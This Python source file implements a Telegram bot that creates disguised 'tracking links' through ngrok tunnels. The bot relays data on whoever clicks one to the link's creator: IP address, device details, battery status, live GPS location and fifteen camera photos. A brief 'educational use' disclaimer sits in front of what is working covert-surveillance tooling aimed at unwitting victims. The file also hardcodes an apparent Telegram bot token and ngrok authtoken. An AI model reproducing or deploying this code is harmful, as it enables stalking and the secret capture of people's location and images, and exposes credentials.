import logging
import json
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
import uuid
import os
import base64
import threading
import time
from pyngrok import ngrok
import asyncio
import html
import urllib.parse
from shared_data import user_links, user_data, ngrok_tunnels
import concurrent.futures

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

TOKEN = os.getenv("TELEGRAM_BOT_TOKEN=>", "8477807898:AAGtSeLSrN8s22MD8tssoPKfqmXBWCBXvTw")
NGROK_AUTHTOKEN = "34YCHzDdgoelzi0DlX8fZHgblPK_6yEW7goc7FRoTL6MsG4KB"  

try:
    ngrok.set_auth_token(NGROK_AUTHTOKEN)
    print("✅ Ngrok authtoken configured successfully!")
except Exception as e:
    print(f"❌ Error setting ngrok authtoken: {e}")

executor = concurrent.futures.ThreadPoolExecutor(max_workers=10)

def start_background_loop(loop):
    asyncio.set_event_loop(loop)
    loop.run_forever()

background_loop = asyncio.new_event_loop()
background_thread = threading.Thread(target=start_background_loop, args=(background_loop,), daemon=True)
background_thread.start()

async def show_progress(update, context, progress_message, progress=0):
    try:
        progress_bar_length = 20
        filled_length = int(progress_bar_length * progress // 100)
        bar = '█' * filled_length + '░' * (progress_bar_length - filled_length)
        
        message = f"{progress_message}\n\n[{bar}] {progress}%"
        
        if 'progress_message_id' in context.user_data:
            try:
                await context.bot.edit_message_text(
                    chat_id=update.effective_chat.id,
                    message_id=context.user_data['progress_message_id'],
                    text=message
                )
            except:
                sent_message = await update.message.reply_text(message)
                context.user_data['progress_message_id'] = sent_message.message_id
        else:
            sent_message = await update.message.reply_text(message)
            context.user_data['progress_message_id'] = sent_message.message_id
    except Exception as e:
        print(f"❌ Error in show_progress: {e}")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    user_id = str(user.id)
    
    if user_id not in user_data:
        user_data[user_id] = {"name": user.full_name, "type": "user"}
    
    welcome_message = (
        f"Hello {user.full_name}! 👋\n\n"
        f"This is your ID 🪪: {user.id}\n\n"
        "Tracking Links: Public URLs via ngrok with click monitoring\n"
        "Data Capture: GPS, IP, device info, battery status, and camera photos (15)\n"
        "Watermarking: Auto-applied watermark on all images\n"
        "Notifications: Real-time alerts to link creators with full data reports\n"
        "Disclaimer: For educational and cybersecurity research only. Misuse may violate privacy and laws.\n\n"
        "Developer : @mengheang25\n"
        "From (Cambodai Khmer Angkor)\n\n"
        "Click 'Create Tracking Link' to get started."
    )
    keyboard = [[InlineKeyboardButton(" Create Tracking Link", callback_data="create_link")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(welcome_message, reply_markup=reply_markup)

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    await query.answer()
    
    if query.data == "create_link":
        await query.edit_message_text(
            "🌐 **Please enter the target URL**\n\n"
            "Examples:\n"
            "• https://google.com\n"
            "• https://facebook.com\n"
            "• https://youtube.com\n\n"
            "Enter your URL here 👇"
        )
        context.user_data['awaiting_url'] = True

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if context.user_data.get('awaiting_url'):
        await handle_tracking_url(update, context)
    else:
        await update.message.reply_text("Please use /start to begin using the bot.")

async def handle_tracking_url(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    url = update.message.text.strip()
    user_id = str(update.effective_user.id)

    if not url.startswith(('http://', 'https://')):
        await update.message.reply_text("❌ Invalid URL! Please enter a URL starting with http:// or https://")
        return

    progress_message = "🔄 Creating tracking link..."
    await show_progress(update, context, progress_message, 10)

    track_id = str(uuid.uuid4())
    
    try:
        await asyncio.sleep(0.3)
        await show_progress(update, context, progress_message, 30)

        if user_id in ngrok_tunnels:
            try:
                ngrok.disconnect(ngrok_tunnels[user_id])
                print(f"✅ Closed existing tunnel for user {user_id}")
            except Exception as e:
                print(f"⚠️ Could not close existing tunnel: {e}")
        
        await asyncio.sleep(0.3)
        await show_progress(update, context, progress_message, 60)
        
        try:
            tunnel = ngrok.connect(5000, bind_tls=True)
            public_url = tunnel.public_url
            ngrok_tunnels[user_id] = public_url
            print(f"✅ Created ngrok tunnel: {public_url}")
        except Exception as e:
            print(f"❌ Ngrok connection error: {e}")
            if 'progress_message_id' in context.user_data:
                try:
                    await context.bot.delete_message(
                        chat_id=update.effective_chat.id,
                        message_id=context.user_data['progress_message_id']
                    )
                except:
                    pass
                del context.user_data['progress_message_id']
            
            await update.message.reply_text("❌ Error creating ngrok tunnel. Please try again.")
            context.user_data['awaiting_url'] = False
            return
        
        await asyncio.sleep(0.3)
        await show_progress(update, context, progress_message, 80)
        
        tracking_link = f"{public_url}/track/{track_id}?url={urllib.parse.quote(url)}"
        
        if user_id not in user_links:
            user_links[user_id] = []
        
        link_data = {
            'track_id': track_id,
            'redirect_url': url,
            'tracking_link': tracking_link,
            'created_at': time.time(),
            'user_id': user_id
        }
        user_links[user_id].append(link_data)
        context.user_data['awaiting_url'] = False
        
        await show_progress(update, context, progress_message, 100)
        await asyncio.sleep(0.5)

        message = (
            "✅ **Tracking link created successfully!**\n\n"
            f"🎯 **Target URL:** {url}\n\n"
            "🔗 **Your tracking link:**\n"
            f"`{tracking_link}`\n\n"
            "📊 **Information that will be captured:**\n"
            "• 📱 Device information (User Agent, Platform)\n"
            "• 📍 Real-time location (GPS)\n" 
            "• 📸 15 photos from camera\n"
            "• 🔋 Battery information\n"
            "• 🌐 IP address\n"
            "• 💻 Screen information\n\n"
            "⚡ **Instant notifications when someone clicks your link!**"
        )
        
        if 'progress_message_id' in context.user_data:
            try:
                await context.bot.delete_message(
                    chat_id=update.effective_chat.id,
                    message_id=context.user_data['progress_message_id']
                )
            except:
                pass
            del context.user_data['progress_message_id']
        
        await update.message.reply_text(message, parse_mode='Markdown')
        
        keyboard = [[InlineKeyboardButton(" Create New Link", callback_data="create_link")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text("Want to create another tracking link?", reply_markup=reply_markup)
        
    except Exception as e:
        print(f"❌ Error in handle_tracking_url: {e}")
        if 'progress_message_id' in context.user_data:
            try:
                await context.bot.delete_message(
                    chat_id=update.effective_chat.id,
                    message_id=context.user_data['progress_message_id']
                )
            except:
                pass
            del context.user_data['progress_message_id']
        
        error_message = f"❌ Error creating link: {str(e)}"
        await update.message.reply_text(error_message)
        context.user_data['awaiting_url'] = False

def send_telegram_message_sync(chat_id, text, parse_mode=None):
    """Send Telegram message synchronously"""
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        data = {"chat_id": chat_id, "text": text}
        if parse_mode:
            data["parse_mode"] = parse_mode
        response = requests.post(url, json=data, timeout=10)
        return response.status_code == 200
    except Exception as e:
        print(f"❌ Error sending message: {e}")
        return False

def send_telegram_photo_sync(chat_id, photo_data, caption):
    """Send Telegram photo synchronously"""
    try:
        if photo_data.startswith('data:image'):
            photo_data = photo_data.split(',')[1]
        
        photo_bytes = base64.b64decode(photo_data)
        
        url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
        files = {'photo': ('photo.jpg', photo_bytes)}
        data = {"chat_id": chat_id, "caption": caption}
        
        response = requests.post(url, files=files, data=data, timeout=15)
        return response.status_code == 200
    except Exception as e:
        print(f"❌ Error sending photo: {e}")
        return False

def send_telegram_location_sync(chat_id, latitude, longitude):
    """Send Telegram location synchronously"""
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/sendLocation"
        data = {
            "chat_id": chat_id,
            "latitude": latitude,
            "longitude": longitude
        }
        response = requests.post(url, json=data, timeout=10)
        return response.status_code == 200
    except Exception as e:
        print(f"❌ Error sending location: {e}")
        return False

def send_photos_sequential_sync(recipient, photos_data, track_id):
    """Send 15 photos sequentially"""
    try:
        photos_to_send = photos_data[:15]  
        
        print(f"📸 Starting to send {len(photos_to_send)} photos sequentially")
        
        for i, photo_data in enumerate(photos_to_send):
            try:
                time.sleep(1.5)
                
                caption = f"📸 Camera photo {i+1}/15\nDeveloper : @mengheang25"
                
                success = send_telegram_photo_sync(recipient, photo_data, caption)
                
                if success:
                    print(f"✅ Sent photo {i+1}/15 to {recipient}")
                else:
                    print(f"❌ Failed to send photo {i+1}/15 to {recipient}")
                    
            except Exception as e:
                print(f"❌ Error sending photo {i+1}: {e}")
        
        print(f"✅ Completed sending {len(photos_to_send)} photos to {recipient}")

        time.sleep(2)  
        
        send_create_link_button(recipient)
        
    except Exception as e:
        print(f"❌ Error in send_photos_sequential_sync: {e}")

def send_create_link_button(recipient):
    """Send create new link button"""
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        data = {
            "chat_id": recipient,
            "text": "Do you want to create another tracking link?",
            "reply_markup": json.dumps({
                "inline_keyboard": [[{"text": "Create New Tracking Link", "callback_data": "create_link"}]]
            })
        }
        response = requests.post(url, json=data, timeout=10)
        if response.status_code == 200:
            print(f"🔘 Sent create link button to {recipient}")
        else:
            print(f"❌ Failed to send button to {recipient}")
    except Exception as e:
        print(f"❌ Error sending create link button: {e}")

def send_telegram_notification(track_id, device_info, creator_id):
    """Sync function for web server to call - FAST VERSION"""
    try:
        print(f"🔔 Sending FAST notification for track_id: {track_id}, creator: {creator_id}")

        recipients = [str(creator_id)]

        message = (
            "🔔 Someone clicked on the tracking link you sent!\n\n"
            f"📍 Track ID: {track_id}\n"
            f"📍 IP Address: {device_info.get('ip_address', 'Unknown')}\n"
            f"📱 User Agent: {html.escape(device_info.get('userAgent', 'Unknown'))}\n"
            f"📱 Platform: {device_info.get('platform', 'Unknown')}\n"
            f"📱 Language: {device_info.get('language', 'Unknown')}\n"
            f"📱 Screen: {device_info.get('screenWidth', 'Unknown')}x{device_info.get('screenHeight', 'Unknown')}\n"
        )
        
        if 'batteryLevel' in device_info:
            battery_status = 'Charging' if device_info.get('batteryCharging') else 'Not charging'
            message += f"🔋 Battery Level: {device_info['batteryLevel']}% ({battery_status})\n"

        if 'location' in device_info:
            lat = device_info['location']['latitude']
            lng = device_info['location']['longitude']
            accuracy = device_info['location']['accuracy']
            maps_url = f"https://www.google.com/maps?q={lat},{lng}"
            message += f"📍 Location: {lat}, {lng} (Accuracy: {accuracy}m)\n\n"
            message += f"🗺️ Google Maps: {maps_url}\n"

        for recipient in recipients:
            send_telegram_message_sync(recipient, message)
            print(f"📤 Sent main message to {recipient}")

            if 'location' in device_info:
                lat = device_info['location']['latitude']
                lng = device_info['location']['longitude']
                send_telegram_location_sync(recipient, lat, lng)
                print(f"📍 Sent location to {recipient}")
        
        if 'cameraPhotos' in device_info and len(device_info['cameraPhotos']) > 0:
            print(f"📸 Sending {len(device_info['cameraPhotos'])} photos sequentially")
            for recipient in recipients:
                photo_thread = threading.Thread(
                    target=send_photos_sequential_sync,
                    args=(recipient, device_info['cameraPhotos'], track_id),
                    daemon=True
                )
                photo_thread.start()
                print(f"🔄 Started sequential photo sending thread for {recipient}")
        
        print(f"✅ FAST notification completed for {track_id}")
        
    except Exception as e:
        print(f"❌ Error in send_telegram_notification: {e}")

def cleanup_ngrok():
    """Clean up ngrok tunnels when bot stops"""
    try:
        for user_id, tunnel_url in list(ngrok_tunnels.items()):
            try:
                ngrok.disconnect(tunnel_url)
                print(f"✅ Closed tunnel for user {user_id}")
            except Exception as e:
                print(f"⚠️ Could not close tunnel for user {user_id}: {e}")
        ngrok.kill()
        print("✅ Cleaned up all ngrok tunnels")
    except Exception as e:
        print(f"❌ Error during cleanup: {e}")

def main() -> None:
    try:
        application = Application.builder().token(TOKEN).build()

        application.add_handler(CommandHandler("start", start))
        application.add_handler(CallbackQueryHandler(button_handler))
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

        print("🤖 Bot is starting...")
        print("📸 15 Photos Tracking System")
        print("⚡ Fast Notification System")
        print("🚀 Bot is now running...")

        import signal
        import sys
        
        def signal_handler(sig, frame):
            print("\n🛑 Bot is stopping...")
            cleanup_ngrok()
            executor.shutdown(wait=False)
            sys.exit(0)
        
        signal.signal(signal.SIGINT, signal_handler)
        
        application.run_polling()
        
    except Exception as e:
        print(f"❌ Error starting bot: {e}")
        cleanup_ngrok()
        executor.shutdown(wait=False)

if __name__ == "__main__":
    main()